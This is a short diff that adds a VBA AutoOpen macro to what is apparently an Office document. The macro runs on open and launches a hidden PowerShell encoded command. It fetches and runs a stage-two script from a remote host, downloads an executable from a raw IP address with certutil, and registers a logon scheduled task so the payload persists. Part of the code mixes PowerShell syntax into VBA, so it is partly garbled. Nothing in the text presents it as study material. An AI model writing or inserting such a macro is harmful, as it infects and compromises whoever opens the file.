@@ -1,0 +1,6 @@
+Sub AutoOpen()
+  Shell "powershell -WindowStyle Hidden -EncodedCommand SQBFAFgA"
+  IEX (New-Object Net.WebClient).DownloadString('http://cdn.malicious-example.com/stage2.ps1')
+  Shell "cmd.exe /c certutil -urlcache -f http://185.220.101.45/payload.exe %TEMP%\p.exe"
+  Shell "schtasks /create /tn UpdaterTask /tr %TEMP%\p.exe /sc onlogon"
+End Sub
